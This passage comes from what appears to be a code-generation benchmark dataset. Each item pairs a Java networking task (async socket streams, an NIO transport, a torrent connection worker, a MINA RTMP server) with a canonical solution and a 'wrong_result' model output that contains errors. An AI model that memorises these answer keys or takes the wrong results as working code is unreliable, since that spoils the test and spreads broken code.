handlerReference;\n        private final Queue<SocketAddress> socketAddressQueue;\n        private final AsynchronousSocketChannel attemptConnectionChannel;\n\n        OpenCompletionHandler(final AsyncCompletionHandler<Void> handler, final Queue<SocketAddress> socketAddressQueue,\n                              final AsynchronousSocketChannel attemptConnectionChannel) {\n            this.handlerReference = new AtomicReference<>(handler);\n            this.socketAddressQueue = socketAddressQueue;\n            this.attemptConnectionChannel = attemptConnectionChannel;\n        }\n\n        @Override\n        public void completed(final Void result, final Object attachment) {\n            setChannel(new AsynchronousSocketChannelAdapter(attemptConnectionChannel));\n            handlerReference.getAndSet(null).completed(null);\n        }\n\n        @Override\n        public void failed(final Throwable exc, final Object attachment) {\n            AsyncCompletionHandler<Void> localHandler = handlerReference.getAndSet(null);\n\n            if (socketAddressQueue.isEmpty()) {\n                if (exc instanceof IOException) {\n                    localHandler.failed(new MongoSocketOpenException(\"Exception opening socket\", getAddress(), exc));\n                } else {\n                    localHandler.failed(exc);\n                }\n            } else {\n                initializeSocketChannel(localHandler, socketAddressQueue);\n            }\n        }\n    }\n\n    private static final class AsynchronousSocketChannelAdapter implements ExtendedAsynchronousByteChannel {\n        private final AsynchronousSocketChannel channel;\n\n        private AsynchronousSocketChannelAdapter(final AsynchronousSocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer dst, final long timeout, final TimeUnit unit, @Nullable final A attach,\n                             final CompletionHandler<Integer, ? super A> handler) {\n            channel.read(dst, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer[] dsts, final int offset, final int length, final long timeout, final TimeUnit unit,\n                             @Nullable final A attach, final CompletionHandler<Long, ? super A> handler) {\n            channel.read(dsts, offset, length, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer src, final long timeout, final TimeUnit unit, final A attach,\n                              final CompletionHandler<Integer, ? super A> handler) {\n            channel.write(src, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer[] srcs, final int offset, final int length, final long timeout, final TimeUnit unit,\n                              final A attach, final CompletionHandler<Long, ? super A> handler) {\n            channel.write(srcs, offset, length, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer dst, final A attachment, final CompletionHandler<Integer, ? super A> handler) {\n            channel.read(dst, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> read(final ByteBuffer dst) {\n            return channel.read(dst);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer src, final A attachment, final CompletionHandler<Integer, ? super A> handler) {\n            channel.write(src, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> write(final ByteBuffer src) {\n            return channel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return channel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            channel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class AsynchronousSocketChannelStream {\n    private final ServerAddress serverAddress;\n    private final InetAddressResolver inetAddressResolver;\n    private final SocketSettings settings;\n    private final AsynchronousChannelGroup group;\n\n    public AsynchronousSocketChannelStream(ServerAddress serverAddress, InetAddressResolver inetAddressResolver, SocketSettings settings, AsynchronousChannelGroup group) {\n        this.serverAddress = serverAddress;\n        this.inetAddressResolver = inetAddressResolver;\n        this.settings = settings;\n        this.group = group;\n    }\n\n    public void openAsync(OperationContext operationContext, AsyncCompletionHandler<Void> handler) {\n        try {\n            InetAddress inetAddress = inetAddressResolver.resolve(serverAddress.getHost());\n            SocketAddress socketAddress = new InetSocketAddress(inetAddress, serverAddress.getPort());\n            AsynchronousSocketChannel channel = AsynchronousSocketChannel.open(group != null ? group : AsynchronousChannelGroup.withCachedThreadPool(null, 10, null));\n            initializeSocketChannel(handler, new LinkedList<>(Arrays.asList(socketAddress)));\n        } catch (Exception e) {\n            handler.failed(e, null);\n        }\n    }\n\n    private void initializeSocketChannel(AsyncCompletionHandler<Void> handler, Queue<SocketAddress> socketAddressQueue) {\n        if (socketAddressQueue.isEmpty()) {\n            handler.failed(new IllegalStateException(\"No socket addresses available\"), null);\n            return;\n        }\n        SocketAddress socketAddress = socketAddressQueue.poll();\n        AsynchronousSocketChannel channel = AsynchronousSocketChannel.open(group != null ? group : AsynchronousChannelGroup.withCachedThreadPool(null, 10, null));\n        channel.connect(socketAddress, this, new OpenCompletionHandler(handler, socketAddressQueue, channel));\n    }\n\n    private class OpenCompletionHandler implements AsyncCompletionHandler<Void> {\n        private final AsyncCompletionHandler<Void> handler;\n        private final Queue<SocketAddress> socketAddressQueue;\n        private final AsynchronousSocketChannel channel;\n\n        public OpenCompletionHandler(AsyncCompletionHandler<Void> handler, Queue<SocketAddress> socketAddressQueue, AsynchronousSocketChannel channel) {\n            this.handler = handler;\n            this.socketAddressQueue = socketAddressQueue;\n            this.channel = channel;\n        }\n\n        @Override\n        public void completed(Void result, Object attachment) {\n            if (channel.isOpen()) {\n                handler.completed(null, null);\n            } else {\n                handler.failed(new IllegalStateException(\"Channel closed unexpectedly\"), null);\n            }\n        }\n\n        @Override\n        public void failed(Throwable exc, Object attachment) {\n            if (!socketAddressQueue.isEmpty()) {\n                initializeSocketChannel(handler, socketAddressQueue);\n            } else {\n                handler.failed(exc, null);\n            }\n        }\n    }\n\n    private class AsynchronousSocketChannelAdapter implements ExtendedAsynchronousByteChannel {\n        private final AsynchronousSocketChannel channel;\n\n        public AsynchronousSocketChannelAdapter(AsynchronousSocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public Future<Integer> read(ByteBuffer dst) {\n            return channel.read(dst);\n        }\n\n        @Override\n        public Future<Integer> write(ByteBuffer src) {\n            return channel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return channel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            channel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 433,
    "Instruction": "Task Description: Implement a Java class that facilitates TCP-based communication using Java NIO (Non-blocking I/O) techniques, supporting both client and server modes with configurable options.\n\nClass Description: NioTransport is a class that provides TCP communication capabilities using Java NIO. It can operate in either server or client mode, supports direct buffers for performance optimization, and includes methods for starting/stopping communication, sending data, and receiving data through a callback mechanism.\n\nAttributes:\n- srv_channel: [ServerSocketChannel] - Server socket channel used in server mode\n- client_channel: [SocketChannel] - Client socket channel for communication\n- receiver_thread: [Receiver] - Thread handling incoming data reception\n- receiver: [RtReceiver] - Callback interface for received data\n- host: [InetAddress] - Host address for connection\n- port: [int] - Port number for communication (default: 7800)\n- server: [boolean] - Flag indicating if operating in server mode\n- direct_buffers: [boolean] - Flag indicating whether to use direct buffers\n- log: [Log] - Logger instance for logging messages\n\nMethods:\n- options(String... options) -> [void] - Configures transport options including server/client mode, host, port, and buffer type\n- receiver(RtReceiver receiver) -> [void] - Sets the receiver callback for incoming data\n- start(String... options) -> [void] - Starts the transport in either server or client mode based on configuration\n- stop() -> [void] - Stops the transport and releases resources\n- send(Object dest, byte[] buf, int offset, int length) -> [void] - Sends data through the established channel\n- Receiver.run() -> [void] - (Inner class method) Continuously receives data and forwards it to the registered receiver",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.tests.rt.RtTransport;\nimport org.jgroups.util.Util;\n\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.List;\n\npublic class NioTransport implements RtTransport {\n    protected ServerSocketChannel srv_channel;\n    protected SocketChannel       client_channel;\n    protected Receiver            receiver_thread;\n    protected RtReceiver          receiver;\n    protected InetAddress         host;\n    protected int                 port=7800;\n    protected boolean             server, direct_buffers;\n    protected final Log           log=LogFactory.getLog(NioTransport.class);\n\n    public NioTransport() {\n    }\n\n    public void options(String... options) throws Exception {\n        if(options == null)\n            return;\n        for(int i=0; i < options.length; i++) {\n            if(options[i].equals(\"-server\")) {\n                server=true;\n                continue;\n            }\n            if(options[i].equals(\"-host\")) {\n                host=InetAddress.getByName(options[++i]);\n                continue;\n            }\n            if(options[i].equals(\"-port\")) {\n                port=Integer.parseInt(options[++i]);\n                continue;\n            }\n            if(options[i].equals(\"-direct\")) {\n                direct_buffers=Boolean.parseBoolean(options[++i]);\n            }\n        }\n        if(host == null)\n            host=InetAddress.getLocalHost();\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver=receiver;\n    }\n\n    public void start(String ... options) throws Exception {\n        options(options);\n        if(server) {\n            srv_channel=ServerSocketChannel.open();\n            srv_channel.bind(new InetSocketAddress(host, port), 50);\n            System.out.println(\"server started (ctrl-c to kill)\");\n            for(;;) {\n                client_channel=srv_channel.accept();\n                receiver_thread=new Receiver();\n                receiver_thread.start();\n            }\n        }\n        else {\n            client_channel=SocketChannel.open();\n            client_channel.connect(new InetSocketAddress(host, port));\n            receiver_thread=new Receiver();\n            receiver_thread.start();\n        }\n    }\n\n    public void stop() {\n        Util.close(srv_channel, client_channel);\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) throws Exception {\n        ByteBuffer sbuf=ByteBuffer.wrap(buf, offset, length);\n        client_channel.write(sbuf);\n    }\n\n    protected class Receiver extends Thread {\n        public void run() {\n            ByteBuffer buf=direct_buffers? ByteBuffer.allocateDirect(RoundTrip.PAYLOAD) : ByteBuffer.allocate(RoundTrip.PAYLOAD);\n            for(;;) {\n                try {\n                    buf.position(0);\n                    int num=client_channel.read(buf);\n                    if(num == -1)\n                        break;\n                    if(num != RoundTrip.PAYLOAD)\n                        throw new IllegalStateException(\"expected \" + RoundTrip.PAYLOAD + \" bytes, but got only \" + num);\n                    if(receiver != null) {\n                        buf.flip();\n                        int offset=buf.hasArray()? buf.arrayOffset() + buf.position() : buf.position(), len=buf.remaining();\n                        if(!buf.isDirect())\n                            receiver.receive(null, buf.array(), offset, len);\n                        else {\n                            byte[] tmp=new byte[len];\n                            buf.get(tmp, 0, len);\n                            receiver.receive(null, tmp, 0, len);\n                        }\n                    }\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n            Util.close(client_channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class NioTransport {\n    private ServerSocketChannel srv_channel;\n    private SocketChannel client_channel;\n    private Thread receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private boolean server;\n    private boolean direct_buffers;\n    private Logger log;\n\n    public void options(String... options) {\n        for (String opt : options) {\n            if (opt.startsWith(\"server=\")) {\n                server = Boolean.parseBoolean(opt.substring(7));\n            } else if (opt.startsWith(\"host=\")) {\n                try {\n                    host = InetAddress.getByName(opt.substring(5));\n                } catch (UnknownHostException e) {\n                    log.severe(\"Invalid host: \" + opt);\n                }\n            } else if (opt.startsWith(\"port=\")) {\n                port = Integer.parseInt(opt.substring(5));\n            } else if (opt.startsWith(\"direct=\")) {\n                direct_buffers = Boolean.parseBoolean(opt.substring(7));\n            }\n        }\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver = receiver;\n    }\n\n    public void start(String... options) {\n        options(options);\n        if (server) {\n            try {\n                srv_channel = ServerSocketChannel.open();\n                srv_channel.configureBlocking(false);\n                srv_channel.socket().bind(new InetSocketAddress(host, port));\n                Selector selector = Selector.open();\n                receiver_thread = new Thread(new Receiver(selector, srv_channel));\n                receiver_thread.start();\n            } catch (IOException e) {\n                log.severe(\"Failed to start server: \" + e.getMessage());\n            }\n        } else {\n            try {\n                client_channel = SocketChannel.open();\n                client_channel.configureBlocking(false);\n                client_channel.connect(new InetSocketAddress(host, port));\n                Selector selector = Selector.open();\n                receiver_thread = new Thread(new Receiver(selector, client_channel));\n                receiver_thread.start();\n            } catch (IOException e) {\n                log.severe(\"Failed to start client: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void stop() {\n        if (server) {\n            try {\n                if (srv_channel != null) {\n                    srv_channel.close();\n                }\n            } catch (IOException e) {\n                log.severe(\"Error closing server channel: \" + e.getMessage());\n            }\n        } else {\n            try {\n                if (client_channel != null) {\n                    client_channel.close();\n                }\n            } catch (IOException e) {\n                log.severe(\"Error closing client channel: \" + e.getMessage());\n            }\n        }\n        if (receiver_thread != null) {\n            receiver_thread.interrupt();\n        }\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) {\n        try {\n            ByteBuffer buffer;\n            if (direct_buffers) {\n                buffer = ByteBuffer.allocateDirect(length);\n            } else {\n                buffer = ByteBuffer.allocate(length);\n            }\n            buffer.put(buf, offset, length);\n            buffer.flip();\n            if (server) {\n                if (client_channel != null && client_channel.isConnected()) {\n                    client_channel.write(buffer);\n                }\n            } else {\n                client_channel.write(buffer);\n            }\n        } catch (IOException e) {\n            log.severe(\"Error sending data: \" + e.getMessage());\n        }\n    }\n\n    private class Receiver implements Runnable {\n        private Selector selector;\n        private Channel channel;\n\n        public Receiver(Selector selector, Channel channel) {\n            this.selector = selector;\n            this.channel = channel;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.currentThread().isInterrupted()) {\n                    selector.select();\n                    Set<SelectionKey> keys = selector.selectedKeys();\n                    Iterator<SelectionKey> it = keys.iterator();\n                    while (it.hasNext()) {\n                        SelectionKey key = it.next();\n                        if (key.isAcceptable()) {\n                            if (server) {\n                                ServerSocketChannel ssChannel = (ServerSocketChannel) channel;\n                                SocketChannel clientChannel = ssChannel.accept();\n                                clientChannel.configureBlocking(false);\n                                clientChannel.register(selector, SelectionKey.OP_READ);\n                            }\n                        } else if (key.isReadable()) {\n                            SocketChannel sc = (SocketChannel) key.channel();\n                            ByteBuffer buffer = ByteBuffer.allocate(1024);\n                            int bytesRead = sc.read(buffer);\n                            if (bytesRead > 0) {\n                                buffer.flip();\n                                receiver.onData(buffer.array(), buffer.position(), bytesRead);\n                                buffer.clear();\n                            }\n                        }\n                        it.remove();\n                    }\n                }\n            } catch (IOException e) {\n                log.severe(\"Error in receiver thread: \" + e.getMessage());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 435,
    "Instruction": "Task Description: Implement a Java class that manages TCP client connections using Java NIO (Non-blocking I/O) techniques, including connection establishment, data writing, and cleanup operations.\n\nClass Description: ConnectionWorker is a Runnable class that handles asynchronous TCP client connections using Java NIO. It manages connection tasks through a selector pattern, processes write operations, and performs periodic cleanup of stale connections. The class supports concurrent operations through queue-based task management.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging operations\n- stop: boolean - Volatile flag to control thread execution\n- selector: Selector - NIO selector for managing channels\n- myConnectQueue: BlockingQueue<ConnectTask> - Queue for pending connection tasks\n- myWriteQueue: BlockingQueue<WriteTask> - Queue for pending write operations\n- mySemaphore: Semaphore - Controls access to the worker thread\n- myKeyProcessors: List<KeyProcessor> - Processors for handling different channel operations\n- myTimeService: TimeService - Provides time-related functionality\n- lastCleanupTime: long - Timestamp of last cleanup operation\n- mySelectorTimeoutMillis: int - Timeout for selector operations\n- myCleanupTimeoutMillis: long - Timeout between cleanup operations\n- myCleanupProcessor: CleanupProcessor - Handles connection cleanup\n- myNewConnectionAllower: NewConnectionAllower - Controls new connection allowance\n\nMethods:\n- run(): void - Main execution method implementing Runnable interface\n- connectToPeersFromQueue(): void - Processes pending connection tasks from queue\n- processSelectedKeys(): void - Processes all ready selection keys\n- processSelectedKey(SelectionKey): void - Processes a single selection key\n- offerConnect(ConnectTask, int, TimeUnit): boolean - Adds new connection task to queue\n- addTaskToQueue(T, int, TimeUnit, BlockingQueue<T>): boolean - Generic method for adding tasks to queues\n- processWriteTasks(): void - Processes pending write operations (implied from code context)\n- cleanup(): void - Performs cleanup operations (implied from code context)\n- needRunCleanup(): boolean - Determines if cleanup is needed (implied from code context)",
    "Canonical_solution": "import com.turn.ttorrent.common.LoggerUtils;\nimport com.turn.ttorrent.common.TimeService;\nimport com.turn.ttorrent.common.TorrentLoggerFactory;\nimport com.turn.ttorrent.network.keyProcessors.CleanupProcessor;\nimport com.turn.ttorrent.network.keyProcessors.KeyProcessor;\nimport org.slf4j.Logger;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.Semaphore;\nimport java.util.concurrent.TimeUnit;\n\npublic class ConnectionWorker implements Runnable {\n\n  private static final Logger logger = TorrentLoggerFactory.getLogger(ConnectionWorker.class);\n  private static final String SELECTOR_THREAD_NAME = \"Torrent channels manager thread\";\n  private volatile boolean stop = false;\n  private final Selector selector;\n  private final BlockingQueue<ConnectTask> myConnectQueue;\n  private final BlockingQueue<WriteTask> myWriteQueue;\n  private final Semaphore mySemaphore;\n  private final List<KeyProcessor> myKeyProcessors;\n  private final TimeService myTimeService;\n  private long lastCleanupTime;\n  private volatile int mySelectorTimeoutMillis;\n  private volatile long myCleanupTimeoutMillis;\n  private final CleanupProcessor myCleanupProcessor;\n  private final NewConnectionAllower myNewConnectionAllower;\n\n  public ConnectionWorker(Selector selector,\n                   List<KeyProcessor> keyProcessors,\n                   int selectorTimeoutMillis,\n                   int cleanupTimeoutMillis,\n                   TimeService timeService,\n                   CleanupProcessor cleanupProcessor,\n                   NewConnectionAllower myNewConnectionAllower) {\n    this.selector = selector;\n    this.myTimeService = timeService;\n    this.lastCleanupTime = timeService.now();\n    this.mySelectorTimeoutMillis = selectorTimeoutMillis;\n    this.myCleanupTimeoutMillis = cleanupTimeoutMillis;\n    this.myCleanupProcessor = cleanupProcessor;\n    this.myNewConnectionAllower = myNewConnectionAllower;\n    this.mySemaphore = new Semaphore(1);\n    this.myConnectQueue = new LinkedBlockingQueue<ConnectTask>(100);\n    this.myKeyProcessors = keyProcessors;\n    this.myWriteQueue = new LinkedBlockingQueue<WriteTask>(5000);\n  }\n\n  @Override\n  public void run() {\n    try {\n      mySemaphore.acquire();\n    } catch (InterruptedException e) {\n      return;\n    }\n\n    final String oldName = Thread.currentThread().getName();\n\n    try {\n      Thread.currentThread().setName(SELECTOR_THREAD_NAME);\n\n      while (!stop && (!Thread.currentThread().isInterrupted())) {\n        try {\n          logger.trace(\"try select keys from selector\");\n          int selected;\n          try {\n            selected = selector.select(mySelectorTimeoutMillis);\n          } catch (ClosedSelectorException e) {\n            break;\n          }\n          connectToPeersFromQueue();\n          processWriteTasks();\n          logger.trace(\"select keys from selector. Keys count is \" + selected);\n          if (selected != 0) {\n            processSelectedKeys();\n          }\n          if (needRunCleanup()) {\n            cleanup();\n          }\n        } catch (Throwable e) {\n          LoggerUtils.warnAndDebugDetails(logger, \"unable to select channel keys. Error message {}\", e.getMessage(), e);\n        }\n      }\n    } catch (Throwable e) {\n      LoggerUtils.errorAndDebugDetails(logger, \"exception on cycle iteration\", e);\n    } finally {\n      Thread.currentThread().setName(oldName);\n      mySemaphore.release();\n    }\n  }\n\n  private void connectToPeersFromQueue() {\n    ConnectTask connectTask;\n    while ((connectTask = myConnectQueue.poll()) != null) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      logger.debug(\"try connect to peer. Connect task is {}\", connectTask);\n      try {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(selector, SelectionKey.OP_CONNECT, connectTask);\n        socketChannel.connect(new InetSocketAddress(connectTask.getHost(), connectTask.getPort()));\n      } catch (IOException e) {\n        LoggerUtils.warnAndDebugDetails(logger, \"unable connect. Connect task is {}\", connectTask, e);\n      }\n    }\n  }\n\n  private void processSelectedKeys() {\n    Set<SelectionKey> selectionKeys = selector.selectedKeys();\n    for (SelectionKey key : selectionKeys) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      try {\n        processSelectedKey(key);\n      } catch (Exception e) {\n        logger.warn(\"error {} in processing key. Close channel {}\", e.getMessage(), key.channel());\n        logger.debug(\"\", e);\n        try {\n          key.channel().close();\n        } catch (IOException ioe) {\n          LoggerUtils.errorAndDebugDetails(logger, \"unable close bad channel\", ioe);\n        }\n      }\n    }\n    selectionKeys.clear();\n  }\n\n  private void processSelectedKey(SelectionKey key) throws IOException {\n    logger.trace(\"try process key for channel {}\", key.channel());\n    myCleanupProcessor.processSelected(key);\n    if (!key.channel().isOpen()) {\n      key.cancel();\n      return;\n    }\n    for (KeyProcessor keyProcessor : myKeyProcessors) {\n      if (keyProcessor.accept(key)) {\n        keyProcessor.process(key);\n      }\n    }\n  }\n\n  public boolean offerConnect(ConnectTask connectTask, int timeout, TimeUnit timeUnit) {\n    if (!myNewConnectionAllower.isNewConnectionAllowed()) {\n      logger.info(\"can not add connect task {} to queue. New connection is not allowed\", connectTask);\n      return false;\n    }\n    return addTaskToQueue(connectTask, timeout, timeUnit, myConnectQueue);\n  }\n\n  private <T> boolean addTaskToQueue(T task, int timeout, TimeUnit timeUnit, BlockingQueue<T> queue) {\n    try {\n      if (queue.offer(task, timeout, timeUnit)) {\n        logger.trace(\"added task {}. Wake up selector\", task);\n        selector.wakeup();\n        return true;\n      }\n    } catch (InterruptedException e) {\n      logger.debug(\"Task {} interrupted before was added to queue\", task);\n    }\n    logger.debug(\"Task {} was not added\", task);\n    return false;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class ConnectionWorker implements Runnable {\n    private final Logger logger;\n    private volatile boolean stop;\n    private final Selector selector;\n    private final BlockingQueue<ConnectTask> myConnectQueue;\n    private final BlockingQueue<WriteTask> myWriteQueue;\n    private final Semaphore mySemaphore;\n    private final List<KeyProcessor> myKeyProcessors;\n    private final TimeService myTimeService;\n    private long lastCleanupTime;\n    private final int mySelectorTimeoutMillis;\n    private final long myCleanupTimeoutMillis;\n    private final CleanupProcessor myCleanupProcessor;\n    private final NewConnectionAllower myNewConnectionAllower;\n\n    public ConnectionWorker(Logger logger, int selectorTimeoutMillis, long cleanupTimeoutMillis) {\n        this.logger = logger;\n        this.stop = false;\n        try {\n            this.selector = Selector.open();\n        } catch (IOException e) {\n            logger.error(\"Failed to open selector\", e);\n            throw new RuntimeException(\"Selector initialization failed\", e);\n        }\n        this.myConnectQueue = new LinkedBlockingQueue<>();\n        this.myWriteQueue = new LinkedBlockingQueue<>();\n        this.mySemaphore = new Semaphore(1);\n        this.myKeyProcessors = new ArrayList<>();\n        this.myTimeService = TimeService.getInstance();\n        this.lastCleanupTime = myTimeService.currentTimeMillis();\n        this.mySelectorTimeoutMillis = selectorTimeoutMillis;\n        this.myCleanupTimeoutMillis = cleanupTimeoutMillis;\n        this.myCleanupProcessor = new CleanupProcessor();\n        this.myNewConnectionAllower = new NewConnectionAllower();\n    }\n\n    @Override\n    public void run() {\n        while (!stop) {\n            try {\n                if (mySemaphore.tryAcquire(1, TimeUnit.MILLISECONDS)) {\n                    try {\n                        connectToPeersFromQueue();\n                        processSelectedKeys();\n                        if (needRunCleanup()) {\n                            cleanup();\n                        }\n                    } finally {\n                        mySemaphore.release();\n                    }\n                }\n            } catch (InterruptedException e) {\n                logger.warn(\"Worker thread interrupted\", e);\n                stop = true;\n            }\n        }\n        try {\n            selector.close();\n        } catch (IOException e) {\n            logger.error(\"Failed to close selector\", e);\n        }\n    }\n\n    private void connectToPeersFromQueue() {\n        while (true) {\n            try {\n                ConnectTask task = myConnectQueue.poll(100, TimeUnit.MILLISECONDS);\n                if (task == null) break;\n                if (!myNewConnectionAllower.isAllowed()) {\n                    logger.warn(\"New connection not allowed\");\n                    continue;\n                }\n                SocketChannel channel = SocketChannel.open();\n                channel.configureBlocking(false);\n                channel.connect(task.getSocketAddress());\n                SelectionKey key = channel.register(selector, SelectionKey.OP_CONNECT);\n                key.attach(task);\n                myKeyProcessors.add(new KeyProcessor(key, task));\n            } catch (Exception e) {\n                logger.error(\"Failed to connect to peer\", e);\n            }\n        }\n    }\n\n    private void processSelectedKeys() throws IOException {\n        if (selector.select(mySelectorTimeoutMillis) <= 0) return;\n        Set<SelectionKey> keys = selector.selectedKeys();\n        Iterator<SelectionKey> it = keys.iterator();\n        while (it.hasNext()) {\n            processSelectedKey(it.next());\n            it.remove();\n        }\n    }\n\n    private void processSelectedKey(SelectionKey key) {\n        if (key.isValid() && key.isConnectable()) {\n            SocketChannel channel = (SocketChannel) key.channel();\n            if (channel.finishConnect()) {\n                logger.info(\"Connection established to {}\", channel.getRemoteAddress());\n                key.interestOps(SelectionKey.OP_WRITE);\n            } else {\n                logger.warn(\"Connection failed for {}\", channel.getRemoteAddress());\n                key.cancel();\n                try {\n                    channel.close();\n                } catch (IOException e) {\n                    logger.error(\"Failed to close channel\", e);\n                }\n            }\n        } else if (key.isValid() && key.isWritable()) {\n            processWriteTasks();\n            key.interestOps(SelectionKey.OP_READ);\n        } else if (key.isValid() && key.isReadable()) {\n            // Handle read operations if needed\n        }\n    }\n\n    public boolean offerConnect(ConnectTask task, int timeout, TimeUnit unit) {\n        return addTaskToQueue(task, timeout, unit, myConnectQueue);\n    }\n\n    private boolean addTaskToQueue(T task, int timeout, TimeUnit unit, BlockingQueue<T> queue) {\n        try {\n            if (mySemaphore.tryAcquire(timeout, unit)) {\n                try {\n                    return queue.offer(task, timeout, unit);\n                } finally {\n                    mySemaphore.release();\n                }\n            }\n            return false;\n        } catch (InterruptedException e) {\n            logger.warn(\"Task addition interrupted\", e);\n            return false;\n        }\n    }\n\n    private void processWriteTasks() {\n        while (true) {\n            WriteTask task = myWriteQueue.poll(100, TimeUnit.MILLISECONDS);\n            if (task == null) break;\n            SocketChannel channel = (SocketChannel) task.getChannel();\n            try {\n                int bytesWritten = channel.write(task.getData());\n                if (bytesWritten == 0) {\n                    logger.warn(\"No bytes written to channel\");\n                }\n            } catch (IOException e) {\n                logger.error(\"Failed to write to channel\", e);\n                try {\n                    channel.close();\n                } catch (IOException ex) {\n                    logger.error(\"Failed to close channel\", ex);\n                }\n            }\n        }\n    }\n\n    private void cleanup() {\n        long currentTime = myTimeService.currentTimeMillis();\n        if (currentTime - lastCleanupTime >= myCleanupTimeoutMillis) {\n            lastCleanupTime = currentTime;\n            for (SelectionKey key : selector.keys()) {\n                if (key.isValid() && !myCleanupProcessor.isAlive(key)) {\n                    try {\n                        ((SocketChannel) key.channel()).close();\n                        key.cancel();\n                    } catch (IOException e) {\n                        logger.error(\"Failed to close stale connection\", e);\n                    }\n                }\n            }\n        }\n    }\n\n    private boolean needRunCleanup() {\n        return myTimeService.currentTimeMillis() - lastCleanupTime >= myCleanupTimeoutMillis;\n    }\n}"
  },
  {
    "Task_id": 437,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Apache MINA framework for RTMP (Real-Time Messaging Protocol) transport, with configurable network settings and JMX monitoring capabilities.\n\nClass Description: RTMPMinaTransport is a TCP server implementation using Apache MINA that handles RTMP connections. It provides configurable network parameters, thread pooling options, and JMX monitoring capabilities. The class manages server lifecycle (start/stop), connection handling, and performance statistics.\n\nAttributes:\n\n- log: Logger - Logger instance for the class\n- executor: ThreadPoolExecutor - Thread pool executor for custom acceptor mode\n- acceptor: SocketAcceptor - MINA socket acceptor instance\n- addresses: Set<String> - Set of IP addresses and ports to bind to\n- ioHandler: IoHandlerAdapter - Handler for IO events\n- ioThreads: int - Number of IO threads (default: 2 * available processors)\n- serviceManagerObjectName: ObjectName - JMX MBean object name\n- stats: IoServiceStatistics - MINA service statistics\n- enableMinaLogFilter: boolean - Flag to enable MINA logging filter\n- enableMinaMonitor: boolean - Flag to enable JMX monitoring\n- minaPollInterval: int - JMX poll interval in ms (default: 1000)\n- tcpNoDelay: boolean - TCP_NODELAY flag (default: true)\n- useHeapBuffers: boolean - Use heap buffers flag (default: true)\n- sendBufferSize: int - Socket send buffer size (default: 65536)\n- receiveBufferSize: int - Socket receive buffer size (default: 65536)\n- readerIdleTime: int - Reader idle time in seconds (default: 2)\n- trafficClass: int - IP traffic class (default: 0x08 | 0x10)\n- backlog: int - Connection backlog (default: 32)\n- thoughputCalcInterval: int - Throughput calculation interval (default: 1)\n- executorKeepAliveTime: long - Thread keep-alive time in ms (default: 60000)\n- enableDefaultAcceptor: boolean - Use default acceptor flag (default: true)\n- initialPoolSize: int - Initial thread pool size (default: 0)\n- maxPoolSize: int - Maximum thread pool size (default: processors + 1)\n- maxProcessorPoolSize: int - Maximum processor pool size (default: 16)\n- keepAlive: boolean - Socket keep-alive flag\n\nMethods:\n\n- start() throws Exception -> void - Starts the TCP server with configured settings\n- stop() -> void - Stops the TCP server and cleans up resources\n- setAddress(String address) -> void - Adds a single address to bind to\n- setAddresses(List<String> addrs) -> void - Adds multiple addresses to bind to\n- setIoHandler(IoHandlerAdapter rtmpIOHandler) -> void - Sets the IO handler\n- setIoThreads(int ioThreads) -> void - Sets number of IO threads\n- setSendBufferSize(int sendBufferSize) -> void - Sets send buffer size\n- setReceiveBufferSize(int receiveBufferSize) -> void - Sets receive buffer size\n- setTrafficClass(int trafficClass) -> void - Sets IP traffic class\n- setBacklog(int backlog) -> void - Sets connection backlog\n- setThoughputCalcInterval(int thoughputCalcInterval) -> void - Sets throughput calculation interval\n- setExecutorKeepAliveTime(long executorKeepAliveTime) -> void - Sets thread keep-alive time\n- setEnableDefaultAcceptor(boolean enableDefaultAcceptor) -> void - Sets default acceptor flag\n- setInitialPoolSize(int initialPoolSize) -> void - Sets initial thread pool size\n- setMaxPoolSize(int maxPoolSize) -> void - Sets maximum thread pool size\n- setMaxProcessorPoolSize(int maxProcessorPoolSize) -> void - Sets maximum processor pool size\n- setTcpNoDelay(boolean tcpNoDelay) -> void - 